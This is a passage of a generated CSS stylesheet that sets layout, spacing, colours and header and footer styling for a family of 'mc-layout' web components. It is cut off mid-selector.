        mc-layout-detail-wizard.mc-layout-v2 .mc-layout-columns,
        mc-layout-list-extra-container.mc-layout-v2 .mc-empty-results-container,
        mc-layout-list-extra-container.mc-layout-v2 .mc-layout-body-container,
        mc-layout-list-extra-container.mc-layout-v2 .mc-layout-columns,
        mc-layout-list-simple.mc-layout-v2 .mc-empty-results-container,
        mc-layout-list-simple.mc-layout-v2 .mc-layout-body-container,
        mc-layout-list-simple.mc-layout-v2 .mc-layout-columns,
        mc-layout-list-table.mc-layout-v2 .mc-empty-results-container,
        mc-layout-list-table.mc-layout-v2 .mc-layout-body-container,
        mc-layout-list-table.mc-layout-v2 .mc-layout-columns,
        mc-layout-list-tabs.mc-layout-v2 .mc-empty-results-container,
        mc-layout-list-tabs.mc-layout-v2 .mc-layout-body-container,
        mc-layout-list-tabs.mc-layout-v2 .mc-layout-columns,
        mc-layout-list-two-columns.mc-layout-v2 .mc-empty-results-container,
        mc-layout-list-two-columns.mc-layout-v2 .mc-layout-body-container,
        mc-layout-list-two-columns.mc-layout-v2 .mc-layout-columns,
        mc-layout-modal-simple.mc-layout-v2 .mc-empty-results-container,
        mc-layout-modal-simple.mc-layout-v2 .mc-layout-body-container,
        mc-layout-modal-simple.mc-layout-v2 .mc-layout-columns {
            flex: 1 1 auto;
            margin: 15px;
        }

        mc-layout-aside-extra-container.mc-layout-v2 .mc-empty-results-container .mc-layout-body-container,
        mc-layout-aside-extra-container.mc-layout-v2 .mc-layout-body-container .mc-layout-body-container,
        mc-layout-aside-extra-container.mc-layout-v2 .mc-layout-columns .mc-layout-body-container,
        mc-layout-aside-extra-pagination-container.mc-layout-v2 .mc-empty-results-container .mc-layout-body-container,
        mc-layout-aside-extra-pagination-container.mc-layout-v2 .mc-layout-body-container .mc-layout-body-container,
        mc-layout-aside-extra-pagination-container.mc-layout-v2 .mc-layout-columns .mc-layout-body-container,
        mc-layout-aside-simple.mc-layout-v2 .mc-empty-results-container .mc-layout-body-container,
        mc-layout-aside-simple.mc-layout-v2 .mc-layout-body-container .mc-layout-body-container,
        mc-layout-aside-simple.mc-layout-v2 .mc-layout-columns .mc-layout-body-container,
        mc-layout-aside-tabs.mc-layout-v2 .mc-empty-results-container .mc-layout-body-container,
        mc-layout-aside-tabs.mc-layout-v2 .mc-layout-body-container .mc-layout-body-container,
        mc-layout-aside-tabs.mc-layout-v2 .mc-layout-columns .mc-layout-body-container,
        mc-help-container.mc-layout-v2 .mc-empty-results-container .mc-layout-body-container,
        mc-help-container.mc-layout-v2 .mc-layout-body-container .mc-layout-body-container,
        mc-help-container.mc-layout-v2 .mc-layout-columns .mc-layout-body-container,
        mc-body-container.mc-layout-v2 .mc-empty-results-container .mc-layout-body-container,
        mc-body-container.mc-layout-v2 .mc-layout-body-container .mc-layout-body-container,
        mc-body-container.mc-layout-v2 .mc-layout-columns .mc-layout-body-container,
        mc-extra-container.mc-layout-v2 .mc-empty-results-container .mc-layout-body-container,
        mc-extra-container.mc-layout-v2 .mc-layout-body-container .mc-layout-body-container,
        mc-extra-container.mc-layout-v2 .mc-layout-columns .mc-layout-body-container,
        mc-side-container.mc-layout-v2 .mc-empty-results-container .mc-layout-body-container,
        mc-side-container.mc-layout-v2 .mc-layout-body-container .mc-layout-body-container,
        mc-side-container.mc-layout-v2 .mc-layout-columns .mc-layout-body-container,
        mc-footer-container.mc-layout-v2 .mc-empty-results-container .mc-layout-body-container,
        mc-footer-container.mc-layout-v2 .mc-layout-body-container .mc-layout-body-container,
        mc-footer-container.mc-layout-v2 .mc-layout-columns .mc-layout-body-container,
        mc-layout-dashboard-simple.mc-layout-v2 .mc-empty-results-container .mc-layout-body-container,
        mc-layout-dashboard-simple.mc-layout-v2 .mc-layout-body-container .mc-layout-body-container,
        mc-layout-dashboard-simple.mc-layout-v2 .mc-layout-columns .mc-layout-body-container,
        mc-layout-dashboard-tabs.mc-layout-v2 .mc-empty-results-container .mc-layout-body-container,
        mc-layout-dashboard-tabs.mc-layout-v2 .mc-layout-body-container .mc-layout-body-container,
        mc-layout-dashboard-tabs.mc-layout-v2 .mc-layout-columns .mc-layout-body-container,
        mc-layout-detail-simple.mc-layout-v2 .mc-empty-results-container .mc-layout-body-container,
        mc-layout-detail-simple.mc-layout-v2 .mc-layout-body-container .mc-layout-body-container,
        mc-layout-detail-simple.mc-layout-v2 .mc-layout-columns .mc-layout-body-container,
        mc-layout-detail-tabs.mc-layout-v2 .mc-empty-results-container .mc-layout-body-container,
        mc-layout-detail-tabs.mc-layout-v2 .mc-layout-body-container .mc-layout-body-container,
        mc-layout-detail-tabs.mc-layout-v2 .mc-layout-columns .mc-layout-body-container,
        mc-layout-detail-wizard.mc-layout-v2 .mc-empty-results-container .mc-layout-body-container,
        mc-layout-detail-wizard.mc-layout-v2 .mc-layout-body-container .mc-layout-body-container,
        mc-layout-detail-wizard.mc-layout-v2 .mc-layout-columns .mc-layout-body-container,
        mc-layout-list-extra-container.mc-layout-v2 .mc-empty-results-container .mc-layout-body-container,
        mc-layout-list-extra-container.mc-layout-v2 .mc-layout-body-container .mc-layout-body-container,
        mc-layout-list-extra-container.mc-layout-v2 .mc-layout-columns .mc-layout-body-container,
        mc-layout-list-simple.mc-layout-v2 .mc-empty-results-container .mc-layout-body-container,
        mc-layout-list-simple.mc-layout-v2 .mc-layout-body-container .mc-layout-body-container,
        mc-layout-list-simple.mc-layout-v2 .mc-layout-columns .mc-layout-body-container,
        mc-layout-list-table.mc-layout-v2 .mc-empty-results-container .mc-layout-body-container,
        mc-layout-list-table.mc-layout-v2 .mc-layout-body-container .mc-layout-body-container,
        mc-layout-list-table.mc-layout-v2 .mc-layout-columns .mc-layout-body-container,
        mc-layout-list-tabs.mc-layout-v2 .mc-empty-results-container .mc-layout-body-container,
        mc-layout-list-tabs.mc-layout-v2 .mc-layout-body-container .mc-layout-body-container,
        mc-layout-list-tabs.mc-layout-v2 .mc-layout-columns .mc-layout-body-container,
        mc-layout-list-two-columns.mc-layout-v2 .mc-empty-results-container .mc-layout-body-container,
        mc-layout-list-two-columns.mc-layout-v2 .mc-layout-body-container .mc-layout-body-container,
        mc-layout-list-two-columns.mc-layout-v2 .mc-layout-columns .mc-layout-body-container,
        mc-layout-modal-simple.mc-layout-v2 .mc-empty-results-container .mc-layout-body-container,
        mc-layout-modal-simple.mc-layout-v2 .mc-layout-body-container .mc-layout-body-container,
        mc-layout-modal-simple.mc-layout-v2 .mc-layout-columns .mc-layout-body-container {
            margin: 0;
        }

        mc-layout-aside-extra-container.mc-layout-v2 .mc-layout-footer-container,
        mc-layout-aside-extra-pagination-container.mc-layout-v2 .mc-layout-footer-container,
        mc-layout-aside-simple.mc-layout-v2 .mc-layout-footer-container,
        mc-layout-aside-tabs.mc-layout-v2 .mc-layout-footer-container,
        mc-help-container.mc-layout-v2 .mc-layout-footer-container,
        mc-body-container.mc-layout-v2 .mc-layout-footer-container,
        mc-extra-container.mc-layout-v2 .mc-layout-footer-container,
        mc-side-container.mc-layout-v2 .mc-layout-footer-container,
        mc-footer-container.mc-layout-v2 .mc-layout-footer-container,
        mc-layout-dashboard-simple.mc-layout-v2 .mc-layout-footer-container,
        mc-layout-dashboard-tabs.mc-layout-v2 .mc-layout-footer-container,
        mc-layout-detail-simple.mc-layout-v2 .mc-layout-footer-container,
        mc-layout-detail-tabs.mc-layout-v2 .mc-layout-footer-container,
        mc-layout-detail-wizard.mc-layout-v2 .mc-layout-footer-container,
        mc-layout-list-extra-container.mc-layout-v2 .mc-layout-footer-container,
        mc-layout-list-simple.mc-layout-v2 .mc-layout-footer-container,
        mc-layout-list-table.mc-layout-v2 .mc-layout-footer-container,
        mc-layout-list-tabs.mc-layout-v2 .mc-layout-footer-container,
        mc-layout-list-two-columns.mc-layout-v2 .mc-layout-footer-container,
        mc-layout-modal-simple.mc-layout-v2 .mc-layout-footer-container {
            flex: 0 0 auto;
            padding: 15px;
            margin-left: 15px;
            margin-right: 15px;
            border-top: 1px solid #CCCCCC;
        }

        mc-layout-aside-extra-container.mc-layout-v2 .mc-layout-header-aside,
        mc-layout-aside-extra-container.mc-layout-v2 .mc-layout-header-modal,
        mc-layout-aside-extra-pagination-container.mc-layout-v2 .mc-layout-header-aside,
        mc-layout-aside-extra-pagination-container.mc-layout-v2 .mc-layout-header-modal,
        mc-layout-aside-simple.mc-layout-v2 .mc-layout-header-aside,
        mc-layout-aside-simple.mc-layout-v2 .mc-layout-header-modal,
        mc-layout-aside-tabs.mc-layout-v2 .mc-layout-header-aside,
        mc-layout-aside-tabs.mc-layout-v2 .mc-layout-header-modal,
        mc-help-container.mc-layout-v2 .mc-layout-header-aside,
        mc-help-container.mc-layout-v2 .mc-layout-header-modal,
        mc-body-container.mc-layout-v2 .mc-layout-header-aside,
        mc-body-container.mc-layout-v2 .mc-layout-header-modal,
        mc-extra-container.mc-layout-v2 .mc-layout-header-aside,
        mc-extra-container.mc-layout-v2 .mc-layout-header-modal,
        mc-side-container.mc-layout-v2 .mc-layout-header-aside,
        mc-side-container.mc-layout-v2 .mc-layout-header-modal,
        mc-footer-container.mc-layout-v2 .mc-layout-header-aside,
        mc-footer-container.mc-layout-v2 .mc-layout-header-modal,
        mc-layout-dashboard-simple.mc-layout-v2 .mc-layout-header-aside,
        mc-layout-dashboard-simple.mc-layout-v2 .mc-layout-header-modal,
        mc-layout-dashboard-tabs.mc-layout-v2 .mc-layout-header-aside,
        mc-layout-dashboard-tabs.mc-layout-v2 .mc-layout-header-modal,
        mc-layout-detail-simple.mc-layout-v2 .mc-layout-header-aside,
        mc-layout-detail-simple.mc-layout-v2 .mc-layout-header-modal,
        mc-layout-detail-tabs.mc-layout-v2 .mc-layout-header-aside,
        mc-layout-detail-tabs.mc-layout-v2 .mc-layout-header-modal,
        mc-layout-detail-wizard.mc-layout-v2 .mc-layout-header-aside,
        mc-layout-detail-wizard.mc-layout-v2 .mc-layout-header-modal,
        mc-layout-list-extra-container.mc-layout-v2 .mc-layout-header-aside,
        mc-layout-list-extra-container.mc-layout-v2 .mc-layout-header-modal,
        mc-layout-list-simple.mc-layout-v2 .mc-layout-header-aside,
        mc-layout-list-simple.mc-layout-v2 .mc-layout-header-modal,
        mc-layout-list-table.mc-layout-v2 .mc-layout-header-aside,
        mc-layout-list-table.mc-layout-v2 .mc-layout-header-modal,
        mc-layout-list-tabs.mc-layout-v2 .mc-layout-header-aside,
        mc-layout-list-tabs.mc-layout-v2 .mc-layout-header-modal,
        mc-layout-list-two-columns.mc-layout-v2 .mc-layout-header-aside,
        mc-layout-list-two-columns.mc-layout-v2 .mc-layout-header-modal,
        mc-layout-modal-simple.mc-layout-v2 .mc-layout-header-aside,
        mc-layout-modal-simple.mc-layout-v2 .mc-layout-header-modal {
            flex: 0 0 auto;
        }

        mc-layout-aside-extra-container.mc-layout-v2 .mc-layout-header-aside .mc-title-item,
        mc-layout-aside-extra-container.mc-layout-v2 .mc-layout-header-modal .mc-title-item,
        mc-layout-aside-extra-pagination-container.mc-layout-v2 .mc-layout-header-aside .mc-title-item,
        mc-layout-aside-extra-pagination-container.mc-layout-v2 .mc-layout-header-modal .mc-title-item,
        mc-layout-aside-simple.mc-layout-v2 .mc-layout-header-aside .mc-title-item,
        mc-layout-aside-simple.mc-layout-v2 .mc-layout-header-modal .mc-title-item,
        mc-layout-aside-tabs.mc-layout-v2 .mc-layout-header-aside .mc-title-item,
        mc-layout-aside-tabs.mc-layout-v2 .mc-layout-header-modal .mc-title-item,
        mc-help-container.mc-layout-v2 .mc-layout-header-aside .mc-title-item,
        mc-help-container.mc-layout-v2 .mc-layout-header-modal .mc-title-item,
        mc-body-container.mc-layout-v2 .mc-layout-header-aside .mc-title-item,
        mc-body-container.mc-layout-v2 .mc-layout-header-modal .mc-title-item,
        mc-extra-container.mc-layout-v2 .mc-layout-header-aside .mc-title-item,
        mc-extra-container.mc-layout-v2 .mc-layout-header-modal .mc-title-item,
        mc-side-container.mc-layout-v2 .mc-layout-header-aside .mc-title-item,
        mc-side-container.mc-layout-v2 .mc-layout-header-modal .mc-title-item,
        mc-footer-container.mc-layout-v2 .mc-layout-header-aside .mc-title-item,
        mc-footer-container.mc-layout-v2 .mc-layout-header-modal .mc-title-item,
        mc-layout-dashboard-simple.mc-layout-v2 .mc-layout-header-aside .mc-title-item,
        mc-layout-dashboard-simple.mc-layout-v2 .mc-layout-header-modal .mc-title-item,
        mc-layout-dashboard-tabs.mc-layout-v2 .mc-layout-header-aside .mc-title-item,
        mc-layout-dashboard-tabs.mc-layout-v2 .mc-layout-header-modal .mc-title-item,
        mc-layout-detail-simple.mc-layout-v2 .mc-layout-header-aside .mc-title-item,
        mc-layout-detail-simple.mc-layout-v2 .mc-layout-header-modal .mc-title-item,
        mc-layout-detail-tabs.mc-layout-v2 .mc-layout-header-aside .mc-title-item,
        mc-layout-detail-tabs.mc-layout-v2 .mc-layout-header-modal .mc-title-item,
        mc-layout-detail-wizard.mc-layout-v2 .mc-layout-header-aside .mc-title-item,
        mc-layout-detail-wizard.mc-layout-v2 .mc-layout-header-modal .mc-title-item,
        mc-layout-list-extra-container.mc-layout-v2 .mc-layout-header-aside .mc-title-item,
        mc-layout-list-extra-container.mc-layout-v2 .mc-layout-header-modal .mc-title-item,
        mc-layout-list-simple.mc-layout-v2 .mc-layout-header-aside .mc-title-item,
        mc-layout-list-simple.mc-layout-v2 .mc-layout-header-modal .mc-title-item,
        mc-layout-list-table.mc-layout-v2 .mc-layout-header-aside .mc-title-item,
        mc-layout-list-table.mc-layout-v2 .mc-layout-header-modal .mc-title-item,
        mc-layout-list-tabs.mc-layout-v2 .mc-layout-header-aside .mc-title-item,
        mc-layout-list-tabs.mc-layout-v2 .mc-layout-header-modal .mc-title-item,
        mc-layout-list-two-columns.mc-layout-v2 .mc-layout-header-aside .mc-title-item,
        mc-layout-list-two-columns.mc-layout-v2 .mc-layout-header-modal .mc-title-item,
        mc-layout-modal-simple.mc-layout-v2 .mc-layout-header-aside .mc-title-item,
        mc-layout-modal-simple.mc-layout-v2 .mc-layout-header-modal .mc-title-item {
            flex: 1 1 auto;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            font-size: 17px;
            font-weight: normal;
            color: #333333;
            padding: 0 15px;
            height: 44px;
            align-items: center;
            display: flex;
        }

        mc-layout-aside-extra-container.mc-layout-v2 .mc-layout-header-aside,
        mc-layout-aside-extra-pagination-container.mc-layout-v2 .mc-layout-header-aside,
        mc-layout-aside-simple.mc-layout-v2 .mc-layout-header-aside,
        mc-layout-aside-tabs.mc-layout-v2 .mc-layout-header-aside,
        mc-help-container.mc-layout-v2 .mc-layout-header-aside,
        mc-body-container.mc-layout-v2 .mc-layout-header-aside,
        mc-extra-container.mc-layout-v2 .mc-layout-header-aside,
        mc-side-container.mc-layout-v2 .mc-layout-header-aside,
        mc-footer-container.mc-layout-v2 .mc-layout-header-aside,
        mc-layout-dashboard-simple.mc-layout-v2 .mc-layout-header-aside,
        mc-layout-dashboard-tabs.mc-layout-v2 .mc-layout-header-aside,
        mc-layout-detail-simple.mc-layout-v2 .mc-layout-header-aside,
        mc-layout-detail-tabs.mc-layout-v2 .mc-layout-header-aside,
        mc-layout-detail-wizard.mc-layout-v2 .mc-layout-header-aside,
        mc-layout-list-extra-container.mc-layout-v2 .mc-layout-header-aside,
        mc-layout-list-simple.mc-layout-v2 .mc-layout-header-aside,
        mc-layout-list-table.mc-layout-v2 .mc-layout-header-aside,
        mc-layout-list-tabs.mc-layout-v2 .mc-layout-header-aside,
        mc-layout-list-two-columns.mc-layout-v2 .mc-layout-header-aside,
        mc-layout-modal-simple.mc-layout-v2 .mc-layout-header-aside {
            background-color: #E5E5E5;
            border-bottom: 1px solid #CCCCCC;
        }

        mc-layout-aside-extra-container.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item,
        mc-layout-aside-extra-pagination-container.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item,
        mc-layout-aside-simple.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item,
        mc-layout-aside-tabs.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item,
        mc-help-container.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item,
        mc-body-container.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item,
        mc-extra-container.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item,
        mc-side-container.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item,
        mc-footer-container.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item,
        mc-layout-dashboard-simple.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item,
        mc-layout-dashboard-tabs.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item,
        mc-layout-detail-simple.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item,
        mc-layout-detail-tabs.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item,
        mc-layout-detail-wizard.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item,
        mc-layout-list-extra-container.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item,
        mc-layout-list-simple.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item,
        mc-layout-list-table.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item,
        mc-layout-list-tabs.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item,
        mc-layout-list-two-columns.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item,
        mc-layout-modal-simple.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item {
            flex: 0 0 auto;
            display: flex;
        }

        mc-layout-aside-extra-container.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item .mc-close-item,
        mc-layout-aside-extra-pagination-container.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item .mc-close-item,
        mc-layout-aside-simple.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item .mc-close-item,
        mc-layout-aside-tabs.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item .mc-close-item,
        mc-help-container.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item .mc-close-item,
        mc-body-container.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item .mc-close-item,
        mc-extra-container.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item .mc-close-item,
        mc-side-container.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item .mc-close-item,
        mc-footer-container.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item .mc-close-item,
        mc-layout-dashboard-simple.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item .mc-close-item,
        mc-layout-dashboard-tabs.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item .mc-close-item,
        mc-layout-detail-simple.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item .mc-close-item,
        mc-layout-detail-tabs.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item .mc-close-item,
        mc-layout-detail-wizard.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item .mc-close-item,
        mc-layout-list-extra-container.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item .mc-close-item,
        mc-layout-list-simple.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item .mc-close-item,
        mc-layout-list-table.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item .mc-close-item,
        mc-layout-list-tabs.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item .mc-close-item,
        mc-layout-list-two-columns.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item .mc-close-item,
        mc-layout-modal-simple.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item .mc-close-item {
            cursor: pointer;
            color: #666666;
            padding: 0 15px;
            display: flex;
            align-items: center;
        }

        mc-layout-aside-extra-container.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item .mc-close-item:hover,
        mc-layout-aside-extra-pagination-container.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item .mc-close-item:hover,
        mc-layout-aside-simple.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item .mc-close-item:hover,
        mc-layout-aside-tabs.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item .mc-close-item:hover,
        mc-help-container.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item .mc-close-item:hover,
        mc-body-container.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item .mc-close-item:hover,
        mc-extra-container.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item .mc-close-item:hover,
        mc-side-container.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item .mc-close-item:hover,
        mc-footer-container.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item .mc-close-item:hover,
        mc-layout-dashboard-simple.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item .mc-close-item:hover,
        mc-layout-dashboard-tabs.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item .mc-close-item:hover,
        mc-layout-detail-simple.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item .mc-close-item:hover,
        mc-layout-detail-tabs.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item .mc-close-item:hover,
        mc-layout-detail-wizard.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item .mc-close-item:hover,
        mc-layout-list-extra-container.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item .mc-close-item:hover,
        mc-layout-list-simple.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item .mc-close-item:hover,
        mc-layout-list-table.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item .mc-close-item:hover,
        mc-layout-list-tabs.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item .mc-close-item:hover,
        mc-layout-list-two-columns.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item .mc-close-item:hover,
        mc-layout-modal-simple.mc-layout-v2 .mc-layout-header-aside .mc-wrapper-close-item .mc-close-item:hover {
            color: #666666;
            text-decoration: none;
        }

        mc-layout-aside-extra-container.mc-layout-v2 .mc-layout-extra-container-aside,
        mc-layout-aside-extra-pagination-container.mc-layout-v2 .mc-layout-extra-container-aside,
        mc-layout-aside-simple.mc-layout-v2 .mc-layout-extra-container-aside,
        mc-layout-aside-tabs.mc-layout-v2 .mc-layout-extra-container-aside,
        mc-help-container.mc-layout-v2 .mc-layout-extra-container-aside,
        mc-body-container.mc-layout-v2 .mc-layout-extra-container-aside,
        mc-extra-container.mc-layout-v2 .mc-layout-extra-container-aside,
        mc-side-container.mc-layout-v2 .mc-layout-extra-container-aside,
        mc-footer-container.mc-layout-v2 .mc-layout-extra-container-aside,
        mc-layout-dashboard-simple.mc-layout-v2 .mc-layout-extra-container-aside,
        mc-layout-dashboard-tabs.mc-layout-v2 .mc-layout-extra-container-aside,
        mc-layout-detail-simple.mc-layout-v2 .mc-layout-extra-container-aside,
        mc-layout-detail-tabs.mc-layout-v2 .mc-layout-extra-container-aside,
        mc-layout-detail-wizard.mc-layout-v2 .mc-layout-extra-container-aside,
        mc-layout-list-extra-container.mc-layout-v2 .mc-layout-extra-container-aside,
        mc-layout-list-simple.mc-layout-v2 .mc-layout-extra-container-aside,
        mc-layout-list-table.mc-layout-v2 .mc-layout-extra-container-aside,
        mc-layout-list-tabs.mc-layout-v2 .mc-layout-extra-container-aside,
        mc-layout-list-two-columns.mc-layout-v2 .mc-layout-extra-container-aside,
        mc-layout-modal-simple.mc-layout-v2 .mc-layout-extra-container-aside {
            flex: 0 0 auto;
            background-color: #F2F2F2;
            padding: 15px;
            border-bottom: 1px solid #CCCCCC;
        }

        mc-layout-aside-extra-container.mc-layout-v2 .mc-layout-extra-container-aside.mc-layout-extra-container-aside-with-tabs,
        mc-layout-aside-extra-pagination-container.mc-layout-v2 .mc-layout-extra-container-aside.mc-layout-extra-container-aside-with-tabs,
        mc-layout-aside-simple.mc-layout-v2 .mc-layout-extra-container-aside.mc-layout-extra-container-aside-with-tabs,
        mc-layout-aside-tabs.mc-layout-v2 .mc-layout-extra-container-aside.mc-layout-extra-container-aside-with-tabs,
        mc-help-container.mc-layout-v2 .mc-layout-extra-container-aside.mc-layout-extra-container-aside-with-tabs,
        mc-body-container.mc-layout-v2 .mc-layout-extra-container-aside.mc-layout-extra-container-aside-with-tabs,
        mc-extra-container.mc-layout-v2 .mc-layout-extra-container-aside.mc-layout-extra-container-aside-with-tabs,
        mc-side-container.mc-layout-v2 .mc-layout-extra-container-aside.mc-layout-extra-container-aside-with-tabs,
        mc-footer-container.mc-layout-v2 .mc-layout-extra-container-aside.mc-layout-extra-container-aside-with-tabs,
        mc-layout-dashboard-simple.mc-layout-v2 .mc-layout-extra-container-aside.mc-layout-extra-container-aside-with-tabs,
        mc-layout-dashboard-tabs.mc-layout-v2 .mc-layout-extra-container-aside.mc-layout-extra-container-aside-with-tabs,
        mc-layout-detail-simple.mc-layout-v2 .mc-layout-extra-container-aside.mc-layout-extra-container-aside-with-tabs,
        mc-layout-detail-tabs.mc-layout-v2 .mc-layout-extra-container-aside.mc-layout-extra-container-aside-with-tabs,
        mc-layout-detail-wizard.mc-layout-v2 .mc-layout-extra-container-aside.mc-layout-extra-container-aside-with-tabs,
        mc-layout-list-extra-container.mc-layout-v2 .mc-layout-extra-container-aside.mc-layout-extra-container-aside-with-tabs,
        mc-layout-list-simple.mc-layout-v2 .mc-layout-extra-container-aside.mc-layout-extra-container-aside-with-tabs,
        mc-layout-list-table.mc-layout-v2 .mc-layout-extra-container-aside.mc-layout-extra-container-aside-with-tabs,
        mc-layout-list-tabs.mc-layout-v2 .mc-layout-extra-container-aside.mc-layout-extra-container-aside-with-tabs,
        mc-layout-list-two-columns.mc-layout-v2 .mc-layout-extra-container-aside.mc-layout-extra-container-aside-with-tabs,
        mc-layout-modal-simple.mc-layout-v2 .mc-layout-extra-container-aside.mc-layout-extra-container-aside-with-tabs {
            border-bottom: 0;
            flex-direction: column;
        }

        mc-layout-aside-extra-container.mc-layout-v2 .mc-layout-footer-container-modal,
        mc-layout-aside-extra-pagination-container.mc-layout-v2 .mc-layout-footer-container-modal,
        mc-layout-aside-simple.mc-layout-v2 .mc-layout-footer-container-modal,
        mc-layout-aside-tabs.mc-layout-v2 .mc-layout-footer-container-modal,
        mc-help-container.mc-layout-v2 .mc-layout-footer-container-modal,
        mc-body-container.mc-layout-v2 .mc-layout-footer-container-modal,
        mc-extra-container.mc-layout-v2 .mc-layout-footer-container-modal,
        mc-side-container.mc-layout-v2 .mc-layout-footer-container-modal,
        mc-footer-container.mc-layout-v2 .mc-layout-footer-container-modal,
        mc-layout-dashboard-simple.mc-layout-v2 .mc-layout-footer-container-modal,
        mc-layout-dashboard-tabs.mc-layout-v2 .mc-layout-footer-container-modal,
        mc-layout-detail-simple.mc-layout-v2 .mc-layout-footer-container-modal,
        mc-layout-detail-tabs.mc-layout-v2 .mc-layout-footer-container-modal,
        mc-layout-detail-wizard.mc-layout-v2 .mc-layout-footer-container-modal,
        mc-layout-list-extra-container.mc-layout-v2 .mc-layout-footer-container-modal,
        mc-layout-list-simple.mc-layout-v2 .mc-layout-footer-container-modal,
        mc-layout-list-table.mc-layout-v2 .mc-layout-footer-container-modal,
        mc-layout-list-tabs.mc-layout-v2 .mc-layout-footer-container-modal,
        mc-layout-list-two-columns.mc-layout-v2 .mc-layout-footer-container-modal,
        mc-layout-modal-simple.mc-layout-v2 .mc-layout-footer-container-modal {
            padding: 15px;
        }

        mc-layout-aside-extra-container.mc-layout-v2 .mc-layout-footer-container-modal .mc-footer-container,
        mc-layout-aside-extra-pagination-container.mc-layout-v2 .mc-layout-footer-container-modal .mc-footer-container,
        mc-layout-aside-simple.mc-layout-v2 .mc-layout-footer-container-modal .mc-footer-container,
        mc-layout-aside-tabs.mc-layout-v2 .mc-layout-footer-container-modal .mc-footer-container,
        mc-help-container.mc-layout-v2 .mc-layout-footer-container-modal .mc-footer-container,
        mc-body-container.mc-layout-v2 .mc-layout-footer-container-modal .mc-footer-container,
        mc-extra-container.mc-layout-v2 .mc-layout-footer-container-modal .mc-footer-container,
        mc-side-container.mc-layout-v2 .mc-layout-footer-container-modal .mc-footer-container,
        mc-footer-container.mc-layout-v2 .mc-layout-footer-container-modal .mc-footer-container,
        mc-layout-dashboard-simple.mc-layout-v2 .mc-layout-footer-container-modal .mc-footer-container,
        mc-layout-dashboard-tabs.mc-layout-v2 .mc-layout-footer-container-modal .mc-footer-container,
        mc-layout-detail-simple.mc-layout-v2 .mc-layout-footer-container-modal .mc-footer-container,
        mc-layout-detail-tabs.mc-layout-v2 .mc-layout-footer-container-modal .mc-footer-container,
        mc-layout-detail-wizard.mc-layout-v2 .mc-layout-footer-container-modal .mc-footer-container,
        mc-layout-list-extra-container.mc-layout-v2 .mc-layout-footer-container-modal .mc-footer-container,
        mc-layout-list-simple.mc-layout-v2 .mc-layout-footer-container-modal .mc-footer-container,
        mc-layout-list-table.mc-layout-v2 .mc-layout-footer-container-modal .mc-footer-container,
        mc-layout-list-tabs.mc-layout-v2 .mc-layout-footer-container-modal .mc-footer-container,
        mc-layout-list-two-columns.mc-layout-v2 .mc-layout-footer-container-modal .mc-footer-container,
        mc-layout-modal-simple.mc-layout-v2 .mc-layout-footer-container-modal .mc-footer-container {
            display: flex;
            flex: 1 1 auto;
            justify-content: flex-end;
        }

        mc-layout-aside-extra-container.mc-layout-v2 .mc-layout-footer-container-modal .mc-footer-container>*+*,
        mc-layout-aside-extra-pagination-container.mc-layout-v2 .mc-layout-footer-container-modal .mc-footer-container>*+*,
